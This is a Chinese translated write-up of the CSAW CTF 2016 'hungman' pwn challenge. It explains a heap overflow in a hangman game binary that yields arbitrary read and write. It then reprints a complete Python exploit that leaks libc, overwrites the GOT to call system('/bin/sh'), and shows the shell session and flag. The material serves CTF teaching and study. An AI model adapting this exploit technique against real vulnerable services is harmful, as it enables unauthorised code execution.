# 【技术分享】一道有趣的CTF PWN题

阅读量 **498934**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2016-11-14 16:22:28

 **x**

##### 译文声明

本文是翻译文章，文章来源：pastebinthehacker

原文地址：<https://pastebinthehacker.blogspot.com.au/2016/09/csaw-2016-hungma>

译文仅供参考，具体内容表达以及含义原文为准。

****

**翻译：**[ **hac425**](http://bobao.360.cn/member/contribute?uid=2553709124)

**稿费：200RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至linwei#360.cn，或登陆**[
**网页版**](http://bobao.360.cn/contribute/index) **在线投稿**

这是CSAW CTF 2016的一道pwn300的题。这道题的利用思路不错,分享下。

题目源码以及分析的ida数据文件下载链接链接:<https://pan.baidu.com/s/1hsFi93A> 密码: jda9

**本地运行题目**

    
    
    socat TCP4-LISTEN:10001,fork EXEC:./hungman

运行这条命令可以让 程序的标准输入输出都重定向到 10001端口,所以我们可以nc连过去

  

**分析**

拿到一道题首先看看开启了哪些安全措施

通过运行这个程序我们可以很容易发现这是一个hangman游戏的实现。

经过初步运行程序大致了解程序的运行流程后就可以使用ida进行逆向分析了。我在逆向分析时遇到了一个大坑.由于太信任ida的f5插件,导致浪费了很多时间.对位于0x400F2D的函数
f5看看

这里我对一些变量改了下名,有没有觉得这里有些比较奇怪的语句.比如:

    
    
    *((_QWORD *)name + 1) = input;
    *((_DWORD *)name + 1) = len;
    memcpy(*((void **)name + 1), &s, len);

乍一看还以为这里有溢出呢, 实际上这里是ida的f5
插件出了些问题.导致反编译的时候出现一些奇怪的语句.所以这里只能去看汇编代码了.搞pwn关键是内存的布局,使用的情况.所以我们在看汇编代码重点要关注的是内存的分配与使用情况,
这个程序所用的结构体的各个数据区的分配,使用大体在下面.做了些注释

GetName 函数

    
    
    .text:0000000000400FC3                 mov     eax, [rbp+input_len]
    .text:0000000000400FC9                 cdqe
    .text:0000000000400FCB                 mov     rdi, rax        ; size
    .text:0000000000400FCE                 call    _malloc   ;分配空间存放刚刚输入的用户名
    .text:0000000000400FD3                 mov     [rbp+input], rax
    .text:0000000000400FDA                 mov     edi, 80h        ; size
    .text:0000000000400FDF                 call    _malloc   ;分配空间作为一个obj对象,存放玩家的信息
    .text:0000000000400FE4                 mov     [rbp+obj], rax
    .text:0000000000400FEB                 mov     rax, [rbp+obj]
    .text:0000000000400FF2                 mov     edx, 80h        ; n
    .text:0000000000400FF7                 mov     esi, 0          ; c
    .text:0000000000400FFC                 mov     rdi, rax        ; s
    .text:0000000000400FFF                 call    _memset
    .text:0000000000401004                 mov     rax, [rbp+obj]
    .text:000000000040100B                 mov     rdx, [rbp+input]
    .text:0000000000401012                 mov     [rax+8], rdx    ;将刚刚分配的一个缓冲器的指针存放到obj偏移8处
    .text:0000000000401016                 mov     rax, [rbp+obj]
    .text:000000000040101D                 mov     edx, [rbp+input_len]
    .text:0000000000401023                 mov     [rax+4], edx     ;把用户名的长度存放到 obj偏移4处
    .text:0000000000401026                 mov     eax, [rbp+input_len]
    .text:000000000040102C                 movsxd  rdx, eax        ; n
    .text:000000000040102F                 mov     rax, [rbp+obj]
    .text:0000000000401036                 mov     rax, [rax+8]
    .text:000000000040103A                 lea     rcx, [rbp+s]
    .text:0000000000401041                 mov     rsi, rcx        ; src
    .text:0000000000401044                 mov     rdi, rax        ; dest
    .text:0000000000401047                 call    _memcpy         ;用户名拷贝到obj偏移8处的指针所指的位置.
    .text:000000000040104C                 mov     rax, [rbp+obj]
    .text:0000000000401053                 mov     rbx, [rbp+var_18]
    .text:0000000000401057                 xor     rbx, fs:28h
    .text:0000000000401060                 jz      short loc_401067
    .text:0000000000401062                 call    ___stack_chk_fail

play_hangman_400B3A函数比较长,就不具体分析了.最后得到obj结构体的结构为

obj + 0: 所得分数

obj + 4: 名称

obj + 8: 存放用户名的指针

obj + 16: 用于存放被猜测的字符.

程序所使用的数据结构分析完了,下一步就是分析程序的逻辑.(逆向的两个主要工作就是分析清楚程序所使用的数据结构及程序的逻辑)程序在获取用户名之后就会进入到玩游戏的主循环.

    
    
    .text:0000000000400ABA LOOP_400ABA:                            ; CODE XREF: main_400A0D+11Ej
    .text:0000000000400ABA     mov     rax, cs:player_obj_6020E0
    .text:0000000000400AC1     mov     edx, [rbp+ur_fd]
    .text:0000000000400AC4     mov     esi, edx                    ; arg2: urandom fd
    .text:0000000000400AC6     mov     rdi, rax                    ; arg1: player object
    .text:0000000000400AC9     call    play_hangman_400B3A
    .....
    .text:0000000000400B28     jz      short BREAK_400B2D
    .text:0000000000400B2A     nop
    .text:0000000000400B2B     jmp     short LOOP_400ABA

play_hangman_400B3A函数是游戏的主体部分.他的第一步工作就是使用一个随机数生成字符串.其长度和我们输入的用户名的长度一致,之后就是一些游戏具体实现逻辑.让我们直接调到漏洞点吧.

  

**漏洞点**

****

    
    
    if ( *(_DWORD *)obj > score )  //如果分数大于预设的分数,值为64时,进入
    {
        puts("High score! change name?");
        __isoc99_scanf(" %c", &v3);
        if ( v3 == 121 )
        {
            s = malloc(0xF8uLL);
            memset(s, 0, 0xF8uLL);
            v8 = read(0, s, 0xF8uLL);
            *(_DWORD *)(obj + 4) = v8;
            v14 = strchr((const char *)s, 10);  //找换行符的位置
            if ( v14 )
            *v14 = 0;
            memcpy(*(void **)(obj + 8), s, v8); //将读取的字符串复制到原来用户名所在的内存区域
            free(s);
        }
        snprintf(buf_512, 0x200uLL, "Highest player: %s", *(_QWORD *)(obj + 8));
        score = *(_DWORD *)obj;
    }

如果你还记得的话,我们在刚开始构建obj结构体时,为用户名分配的内存大小是0x80的,然而这里程序没有考虑到这一点,而是直接读取最大字节数为0xf8的字符,然后复制到先前分配的那块内存中去.假设在开始设置用户名时我们输入10个字符,接着使我们游戏分数大于64,
接着我们就可以修改用户名,这时,将用户名设置为0xf8大小之后复制到原来存储用户名的内存区时就会触发一个堆溢出.通过分析程序开始到这里的内存使用情况,此时堆内存布局是这样的

我们就可以通过溢出name,进而覆盖obj对象的name指针,来实现一个漏洞利用.

  

**漏洞利用**

a. 首先我们需要使我们的分数达到64分以上,我们可以通过发生从 a 到 z的所有字符直到我们能够猜到大妈的所以字符.那么我们就能取得一个很高的分数.

b. 一旦我们重写了位于 obj 结构体中的 name 指针我们将很容易就可以实现任意地址读写,下面来分析下怎么实现任意地址读写.

    
    
    memcpy(*(void **)(obj + 8), s, v8);
    free(s);
    }
    snprintf(buf_512, 0x200uLL, "Highest player: %s", *(_QWORD *)(obj + 8));
    score = *(_DWORD *)obj;

当溢出发生后,紧接着就会把 obj + 8 处的存放的指针的数据打印出来,通过溢出我们是可以控制这个指针的值的. 那么任意地址读实现,我们可以用它来读取
got 表中的一些函数,进而实现对aslr的绕过.接下来我们在玩一次,并且比分也能在 64 以上,我们就能往刚刚设置的 地址处写入内容.进而任意地址写实现.

c. 我们现在有了一个任意地址读写的漏洞,该怎么去利用他呢.从一开始我们就检查了 程序开启的防护措施,

他开了 nx 也就是数据执行保护,RELPO 的属性是 Partial , 那么我们就可以通过覆写 got 表来实现漏洞利用.要使用 got
表覆写的话,自然而然的想到应该覆写 free 函数在 got表的地址为 system函数的地址,因为在调用 memcpy 函数之后,紧接着就调用了
free函数.

    
    
    .text:0000000000400EC4     call    _memcpy                     ; overflow!
    .text:0000000000400EC9     mov     rax, [rbp+s]
    .text:0000000000400ECD     mov     rdi, rax                    ; ptr
    .text:0000000000400ED0     call    _free

听起来还是不错的,但是这里还有一个坑,就是我们在覆写 got 表的时候,此时的 [rbp+s] 所指向的内存的字符串的不是以 /bin/shx00
开始的,而是要覆盖 free 函数指针的值.因此如果直接将 got表中 free函数的值覆盖为 system函数的地址,并不能执行
system("/bin/sh") 也就不能 pwn成功.所以要想实现 getshell ,
我们需要做的是找到一个函数的调用点,他的第一个参数指向的内存区域的内容我们可控,这样我们就能通过函数 覆写 got 表来使得调用他时实际调用的函数为
system,然后执行 system("/bin/sh") 搞定它.经过查找找到了一个

    
    
    .text:0000000000400A33                 mov     edx, 200h       ; n
    .text:0000000000400A38                 mov     esi, 0          ; c
    .text:0000000000400A3D                 mov     edi, offset buf_512 ; s
    .text:0000000000400A42                 call    _memset
    .bss:0000000000602100 ; char buf_512[512]
    .bss:0000000000602100 buf_512         db 200h dup(?)          ; DATA XREF: main+30o
    .bss:0000000000602100                                         ; main+44o ...
    .bss:0000000000602300 score           dd ?                    ; DATA XREF: main+4Ew
    .bss:0000000000602300

在main 函数中调用 memset 函数时它的第一个参数为指向 .bss 段的一个未初始化的内存,又由于之前我们已经能对got实现写入 最大
0xf8字节的数据.所以我们可以从 got表的 free 函数开始写 ,一直写到.bss:0000000000602100 ; char
buf_512[512] 并且把got 表中memset函数的地址设为system函数的地址.实现漏洞的利用.由于覆盖整个 got
表,其他函数的地址也会被修改,所以我还需要针对got的修改实现一条 调用链,确保能正常的执行到main函数中的memset,然后就能getshell
啦.具体的利用过程,结合大牛写的exp来分析.就拿一些关键的点出来分析,其他的请自行结合exp分析.

第一步溢出 name ,修改 obj 偏移8处的地址.

    
    
    # -------------------------------------------------------------------------        # first overflow: Arbitrary read
        # -------------------------------------------------------------------------        ovfl  = "A" * 128                               # fill name
        ovfl += struct.pack("<Q", 0x1122334455667788)   # prevsize (heap meta)
        ovfl += struct.pack("<Q", 0x1122334455667788)   # size (heap meta)
        ovfl += struct.pack("<L", 0x200)                # score (must be >64) 
        ovfl += struct.pack("<L", 0x128)                # name length
        ovfl += struct.pack("<Q", 0x0000000000602018)   #把name 指针的值修改为got表中free函数的地址
        s.send( ovfl + "n")

然后读出free函数在libc中的地址,使用偏移计算其他关键函数的地址.

    
    
        r = recv_until("Continue? ")
        off  = r.find("Highest player: ") + len("Highest player: ")
        free = struct.unpack("<Q", r[off:off + 8])[0] & 0x0000ffffffffffff
        print "[+] Leaking address of free(): ", hex(free)
        memset     = free + (0x78890 - 0x817c0)
        setvbuf    = free - (0x78890 - 0x67dd0)
        system     = free - (0x83a70 - 0x45380)
        libc_start = free - (0x83a70 - 0x20740)

然后第二次进入游戏,进入 memcpy分支,覆盖got表到bss段

    
    
        ovfl  = struct.pack("<Q", 0x0000000000400D0E)   # free = .text:00400D0E call _puts
        ovfl += struct.pack("<Q", 0x0000000000400920)   # puts = .text:00400920 start proc near  调到程序的入口,通过调用 libc_statc_main 调用main函数
        ovfl += "A"*8 *5                                # 这些函数没影响
        ovfl += struct.pack("<Q", system)               # memset = system   将memset函数指针修改为 system函数指针
        ovfl += "B" * 8 * 2                             #
        ovfl += struct.pack("<Q", libc_start)           # 修复 libc_statc_main 函数地址,因为后面要通过调用他来调用main函数,从而调用 memset函数.
        ovfl += "C" * 8 * 3                             #
        ovfl += struct.pack("<Q", 0x0000000000400B39)   # setvbuf = .text:00400B39 retn   //设为类似nop指令,避免程序出错
        ovfl += "D" * 8 * 3                             #
        ovfl += "/bin/shx00" + "E" * 16                # .data
        ovfl += struct.pack("<Q", 0x00) + "F" * 56      #
        ovfl += "/bin/shx00" + "G" * 8                 #  //将 .bss:0000000000602100 的值设为以/bin/shx00开头的字符串
        ovfl += struct.pack("<Q", 0x00000000006020A8)   # .data:006020A8 = &/bin/sh
        s.send(ovfl + "n")

通过上面的注释,我再来捋一捋整个调用链的流程,在 memcpy 后,程序的 got 表被完全覆盖,之后会马上调用 free函数, 由于 free函数在got
表中的地址被改为 00400D0E ,该地址处的指令为 call _puts ,然后会调用 puts函数, puts函数的地址也被修改,调用puts
函数后会进入到

然后他会调用 ___libc_start_main
这个函数地址已经被我们修复了,所以会正常的执行main函数,会执行到memset函数,实际上调用的是system函数,且其参数也被设为了
/bin/shx00,我们通过调试试试是否能按exp的预期拿到shell

可以看到 memset函数的指针被覆盖为了system函数的地址,并且他的第一个参数所指向的内存也是以
/bin/shx00开头,其他got表中的地址也满足预期.单步运行下去可以发现就是按我上面所说的那样执行的.

附上exp:

    
    
    #!/usr/bin/env python2
    # --------------------------------------------------------------------------------------------------    import socket
    import struct
    import telnetlib
    import string
    # --------------------------------------------------------------------------------------------------    def recv_until(st):  # receive until you encounter a string
        ret = ""
        while st not in ret:
            ret += s.recv(8192)
        return ret
    # --------------------------------------------------------------------------------------------------    if __name__ == "__main__":
        s = socket.create_connection(('127.0.0.1', 10001))
        #s = socket.create_connection(('localhost', 7777))
        f = s.makefile()                                # associate a file object with socket
        recv_until("What's your name?")                 # eat banner
        s.send( "A"*128 + "n" )                        # set a big name
        recv_until( "n" )
        print "[+] Winning the game once..."
        for c in string.ascii_lowercase:                # win the game
            s.send( c + "n")
            recv_until( "n" )
        s.send(' yn')                                  # change username
        raw_input();
        # -------------------------------------------------------------------------        # first overflow: Arbitrary read
        # -------------------------------------------------------------------------        ovfl  = "A" * 128                               # fill name
        ovfl += struct.pack("<Q", 0x1122334455667788)   # prevsize (heap meta)
        ovfl += struct.pack("<Q", 0x1122334455667788)   # size (heap meta)
        ovfl += struct.pack("<L", 0x200)                # score (must be >64) 
        ovfl += struct.pack("<L", 0x128)                # name length
        ovfl += struct.pack("<Q", 0x0000000000602018)   # address of .got.free()
        s.send( ovfl + "n")
        r = recv_until("Continue? ")
        # print list(r)
        off  = r.find("Highest player: ") + len("Highest player: ")
        free = struct.unpack("<Q", r[off:off + 8])[0] & 0x0000ffffffffffff
        print "[+] Leaking address of free(): ", hex(free)
        '''
        Offsets from my libc:
            1349: 000000000003f510    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
            2230: 0000000000078890   146 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5
            2116: 0000000000020610   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
            844:  00000000000817c0    65 IFUNC   GLOBAL DEFAULT   13 memset@@GLIBC_2.2.5
            1880: 0000000000067dd0   518 FUNC    WEAK   DEFAULT   13 setvbuf@@GLIBC_2.2.5
        '''
        system     = free - (0x78890 - 0x3f510)
        libc_start = free - (0x78890 - 0x20610)
        memset     = free + (0x78890 - 0x817c0)
        setvbuf    = free - (0x78890 - 0x67dd0)
        '''
        Offsets from libc-2.23.so:
            1351: 0000000000045380    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5+
            2232: 0000000000083a70   460 FUNC    GLOBAL DEFAULT   13 free@@GLIBC_2.2.5
            2118: 0000000000020740   458 FUNC    GLOBAL DEFAULT   13 __libc_start_main@@GLIBC_2.2.5
        '''
        system     = free - (0x83a70 - 0x45380)
        libc_start = free - (0x83a70 - 0x20740)
        
        s.send(' yn')                                  # play the game again
        recv_until("n")
        for c in string.ascii_lowercase:                # win the game again
            s.send( c + "n")
            print recv_until( "n" ),
        print
        s.send(' yn')                                  # change name again
        print "[+] free() at", hex(free)
        print "[+] system() at", hex(system)
        print "[+] __libc_start_main() at", hex(libc_start)
        print 
        print "[+] Overwriting GOT..."
        # -------------------------------------------------------------------------        # second overflow: Arbitrary write to GOT
        # -------------------------------------------------------------------------        # 0x400A2E contains a newline
        #
        # control flow:
        #   1. Overflow in memcpy() at 0x400EC4
        #   2. Hijack control during call to free() at 0400ED0
        #   3. go to .text:00400D0E call _puts
        #   4. go to .text:00400920 start proc near
        #   5. go to main()
        #
        #   SOLUTION A:
        #       6. call setvbuf()  (actually system)
        #
        #   SOLUTION B:
        #       6. call setvbuf() (make it idle; point to retn)
        #       7. call memset() (actuall system)
        #
        # Payload contains both solutions, but only one is used.
        # 
        ovfl  = struct.pack("<Q", 0x0000000000400D0E)   # free = .text:00400D0E call _puts
        ovfl += struct.pack("<Q", 0x0000000000400920)   # puts = .text:00400920 start proc near
        ovfl += "A"*8 *5                                # ignore these entries
        ovfl += struct.pack("<Q", system)               # memset = system
        ovfl += "B" * 8 * 2                             #
        ovfl += struct.pack("<Q", libc_start)           # recover __libc_start_main
        ovfl += "C" * 8 * 3                             #
        ovfl += struct.pack("<Q", 0x0000000000400B39)   # setvbuf = .text:00400B39 retn
        ovfl += "D" * 8 * 3                             #
        ovfl += "/bin/shx00" + "E" * 16                # .data
        ovfl += struct.pack("<Q", 0x00) + "F" * 56      #
        ovfl += "/bin/shx00" + "G" * 8                 #
        ovfl += struct.pack("<Q", 0x00000000006020A8)   # .data:006020A8 = &/bin/sh
        s.send(ovfl + "n")
        # -------------------------------------------------------------------------        # get shell
        # ------------------------------------------------------------------------        s.send( '`;')                                   # fix backtick problem
        print '[+] Opening Shell...'
        t = telnetlib.Telnet()                          # try to open shell
        t.sock = s
        t.interact()
    # --------------------------------------------------------------------------------------------------    '''
    root@eyh:~/ctf/csaw_16# ./hungman_expl.py 
    [+] Winning the game once...
    [+] Leaking address of free():  0x7f9776b85a70
    ___a__________________________________________________a___________________________________________a__a______________________________a_____________a______________________________________________a_______________________________________________________________________________________________a_____
    ___a___________________b______________________________a___________________________________________a__a______b_______________________a__________bb_a___b____________________b___b_________________abb_____b_______b_____b_______________________________________b________b______________b_________ab____
    ___a_c___c__c_c________b______________________________a______c_____c______________________c_______a__a______b_______________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b_____b_______________________________________b__c_____b______________b_________ab____
    ___a_c___c__c_c____d___b_________________________dd___a_____dc___d_c_____________________dc_______a_da______b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab____
    ___a_c___c__c_c____d___b_________________________dd_e_a_____dce__d_c____________e________dc_______a_da_e____b____d__________________a______cc__bb_a___b_____c______________b___b_________________abb_____b____c__b____db_______________________________________b__c_____b______________b_________ab____
    ___a_c___c__c_c____d__fb______f________________f_dd_e_a_____dce__d_c_____f____f_e________dc_______a_da_e____b____d_______________f__a____f_cc__bb_a___b_____c______________b___b___f_____________abb_____b_f__cf_b_f__db____f___________________ff_____________b__c_____b______________b_________ab____
    ___a_c___c__c_c____d__fb___gg_f_________g______f_dd_e_a_____dce__d_c_____f_gg_f_e________dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a___b_____c______________b_ggb___f__________g__abb_____b_f__cf_b_f__db____f______________g____ff_____________b__c_____b____________g_b______g__ab____
    ___a_c___c__c_c____d__fb___gg_f_________g__h__hf_dd_e_a_____dce__d_c_____f_gg_f_e_h______dc_____g_a_da_e____b____d_____g_________f__a____f_cc__bb_a_h_b_____c______________b_ggb___f__________g__abb____hb_f__cf_b_f__db___hf______________g_h__ff_h___________b__c____hb___h_______hg_b______g__ab____
    ___a_c___c__c_c____d__fb___gg_f_i_______g__h__hf_ddie_a___i_dce__d_c___i_f_gg_f_e_h______dc_____g_a_da_e__i_b_i__d_i_i_g_________f__a____f_cc__bb_a_h_b____ic____________i_b_ggb___f_______i__g__abb____hb_fi_cf_b_fi_db___hf______________g_h__ff_h______i___ib__c__i_hb___h_i_____hg_b___i__g_iab_i__
    ___a_c___c__c_c____d__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__d_cj__i_f_gg_f_e_h______dc_____gja_da_e__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_h_b____ic____________i_b_ggb___f_______i__g__abb_j__hb_fijcf_b_fi_db___hf______________g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i__
    ___a_c___c__c_c___kd__fbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcj__i_f_gg_f_e_h__k___dc_____gja_dake__ijb_i__d_i_i_g_________f__a____f_cc_jbb_a_hkb_k__ic____________i_b_ggb___f___k___i__g__abb_j__hb_fijcf_b_fi_db___hfk_____k___k___g_h__ff_h__jj__i___ib__c__i_hb__jh_i_____hg_b___i__g_iab_i__
    ___a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hf_ddie_a___i_dce__dkcjl_i_f_gg_f_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g____l____f__a____f_cc_jbb_a_hkb_k__icl__l_l______i_b_ggb___f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lk___k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_i__
    ___a_c___c__c_c___kd_lfbjjjggjfji_______g__h__hfmddie_a___i_dce__dkcjl_i_fmggmf_e_h__k___dc_____gja_dakel_ijb_i__d_i_i_g___ml_m__f__a____f_ccmjbb_a_hkb_k__icl__l_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfk____lkm__k___g_h__ff_h__jj__i___ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm
    ___a_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_i_dce__dkcjlni_fmggmf_e_h__k___dc____ngja_dakelnijb_i__d_i_i_g___mlnm__fn_a____f_ccmjbb_a_hkb_k__icl_nl_l______i_b_ggbm__f___k___i__g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkm__k___g_h__ff_h__jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliab_imm
    __oa_c___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_ann_iodce__dkcjlniofmggmf_e_h__k___dc__o_ngja_dakelnijb_i__d_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l______i_boggbm__f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm
    __oapc___c__c_c___kd_lfbjjjggjfji_______g_nh__hfmddie_annpiodce__dkcjlniofmggmf_e_h__k__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a___of_ccmjbboa_hkb_k__icl_nl_l___p__i_boggbmp_f___k___io_g_labb_j__hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_ho_jj__in__ib_lc__i_hb__jh_i_____hg_b___i_lgliaboimm
    _qoapcq_qc__c_c___kd_lfbjjjggjfji_______gqnh__hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iog___mlnm__fn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_g_labb_jq_hb_fijcf_b_fi_db___hfkn_n_lkmo_k___g_h__ff_hoqjj__in__ib_lc__i_hb__jh_i_____hg_b__qi_lgliaboimm
    _qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pd_i_iogr_rmlnm_rfn_a_qqof_ccmjbboa_hkb_k__icl_nl_l___p_qi_boggbmp_fqq_k___io_grlabb_jq_hb_fijcfrb_fi_db___hfkn_n_lkmo_k__rg_h__ff_hoqjj__in_rib_lc__i_hb__jh_i____rhg_br_qi_lgliaboimm
    _qoapcq_qc__c_c___kd_lfbjjjggjfji__rr___gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_e_h_qk__pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkn_n_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqi_lgliaboimm
    _qoapcq_qc__c_c___kd_lfbjjjggjfji__rrt__gqnhr_hfmddie_annpiodce_qdkcjlniofmggmf_eth_qkt_pdc__o_ngjapdakelnijbpi_pdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ks_icl_nl_l___p_qisboggbmpsfqq_k___io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosk__rg_h__ffshoqjj_sin_rib_lc__i_hb__jh_i_s__rhg_brsqitlgliaboimm
    _qoapcq_qcu_c_c___kd_lfbjjjggjfji__rrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmf_eth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqq_k_u_io_grlabb_jq_hb_fijcfrb_fi_db_s_hfkntn_lkmosku_rg_h__ffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm
    _qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddie_annpiodceuqdkcjlniofmggmfveth_qktupdc__oungjapdakelnijbpiupdsi_iogr_rmlnm_rfn_asqqof_ccmjbboa_hkb_ksuicl_nl_l___puqisboggbmpsfqqvkvu_io_grlabb_jq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrg_h_vffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm
    _qoapcqvqcu_cvcv__kd_lfbjjjggjfjivvrrt__gqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdc__oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkb_ksuicl_nl_lw__puqisboggbmpsfqqvkvu_io_grlabbwjq_hbvfijcfrbvfi_db_s_hfkntnvlkmoskuvrgwhwvffshoqjjusin_rib_lc__iuhb__jhuiusuurhgubrsqitlgliaboimm
    _qoapcqvqcu_cvcvx_kd_lfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnm_rfnwasqqof_ccmjbboa_hkbxksuiclxnl_lwx_puqisboggbmpsfqqvkvu_ioxgrlabbwjq_hbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxrib_lc_xiuhb_xjhuiusuurhgubrsqitlgliaboimm
    yqoapcqvqcu_cvcvxykdylfbjjjggjfjivvrrtxxgqnhruhfmddiewannpiodceuqdkcjlniofmggmfvethwqktupdcx_oungjapdakelnijbpiupdsi_iogrwrmlnmyrfnwasqqofyccmjbboa_hkbxksuiclxnlylwxypuqisboggbmpsfqqvkvuyioxgrlabbwjqyhbvfijcfrbvfi_db_sxhfkntnvlkmoskuvrgwhwvffshoqjjusinxribylc_xiuhb_xjhuiusuurhgubrsqitlgliaboimm
    High score! change name?
    [+] free() at 0x7f9776b85a70
    [+] system() at 0x7f9776b47380
    [+] __libc_start_main() at 0x7f9776b22740
    [+] Overwriting GOT...
    [+] Opening Shell...
        id
            uid=1000(hungman) gid=1000(hungman) groups=1000(hungman)
        ls -la
            total 36
            drwxr-x---  2 root hungman  4096 Sep 16 21:31 .
            drwxr-xr-x 10 root root     4096 Sep 16 21:31 ..
            -rw-r--r--  1 root hungman   220 Sep 16 21:31 .bash_logout
            -rw-r--r--  1 root hungman  3771 Sep 16 21:31 .bashrc
            -rw-r--r--  1 root hungman   655 Sep 16 21:31 .profile
            -rw-rw-r--  1 root root       41 Sep 16 21:13 flag.txt
            -rwxrwxr-x  1 root root    10464 Sep 16 21:13 hungman
        cat flag.txt
            flag{this_looks_like_its_a_well_hungman}
        exit
    *** Connection closed by remote host ***
    root@eyh:~/ctf/csaw_16# 
    '''
    # --------------------------------------------------------------------------------------------------
  

**总结**

分析和学习这个pwn时,发现

1\. 在逆向时不能太相信ida 的f5插件,当f5反编译出来的代码逻辑比较奇怪时,要去看汇编代码.

2\. 同时要多调试,很多看似复杂的东西,调试过去就能够很容易的理解.

3\. 这个漏洞的利用手法不错,通过覆盖got表形成了一种类似于 rop的调用链最终实现了漏洞利用.

本文翻译自pastebinthehacker
[原文链接](https://pastebinthehacker.blogspot.com.au/2016/09/csaw-2016-hungma)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **for_while** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/84905](/post/id/84905)

安全客 - 有思想的安全新媒体

本文转载自:
[pastebinthehacker](https://pastebinthehacker.blogspot.com.au/2016/09/csaw-2016-hungma)

如若转载,请注明出处：
<https://pastebinthehacker.blogspot.com.au/2016/09/csaw-2016-hungma>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [安全知识](/tag/安全知识)

 **+1** __0赞

 __收藏

![](https://p5.ssl.qhmsg.com/dm/200_200_100/t011d66e4d0ee6ef2b8.jpg) for_while

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

